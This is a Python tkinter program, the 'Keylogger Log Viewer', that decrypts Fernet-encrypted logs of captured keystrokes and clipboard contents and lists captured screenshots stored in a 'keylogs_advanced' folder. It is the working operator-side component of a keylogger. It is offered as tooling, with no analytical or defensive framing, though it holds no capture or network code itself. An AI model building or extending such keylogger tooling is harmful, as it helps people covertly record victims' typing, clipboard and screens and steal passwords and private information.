import os
import tkinter as tk
from tkinter import scrolledtext
from cryptography.fernet import Fernet

log_dir = os.path.join(os.path.dirname(__file__), "keylogs_advanced")
key_file = os.path.join(log_dir, "key.key")

# ✅ Read the key correctly and initialize Fernet
with open(key_file, 'rb') as f:
    encryption_key = f.read()

fernet = Fernet(encryption_key)


def decrypt_file(filepath):
    lines = []
    with open(filepath, 'rb') as f:
        for line in f:
            try:
                lines.append(fernet.decrypt(line.strip()).decode())
            except Exception as e:
                lines.append(f"[Error] {e}")
    return lines

def show_logs(filetype):
    filepath = os.path.join(log_dir, f"{filetype}.txt")
    output.delete(1.0, tk.END)
    if os.path.exists(filepath):
        lines = decrypt_file(filepath)
        output.insert(tk.END, "\n".join(lines))
    else:
        output.insert(tk.END, f"[!] {filetype}.txt not found")

def browse_images():
    output.delete(1.0, tk.END)
    images = [f for f in os.listdir(log_dir) if f.endswith(".png")]
    if images:
        output.insert(tk.END, "\n".join(images))
    else:
        output.insert(tk.END, "[!] No screenshots found")

root = tk.Tk()
root.title("Keylogger Log Viewer")

tk.Button(root, text="Show Keystrokes", command=lambda: show_logs("keystrokes")).pack()
tk.Button(root, text="Show Clipboard", command=lambda: show_logs("clipboard")).pack()
tk.Button(root, text="Browse Screenshots", command=browse_images).pack()

output = scrolledtext.ScrolledText(root, width=80, height=30)
output.pack()

root.mainloop()
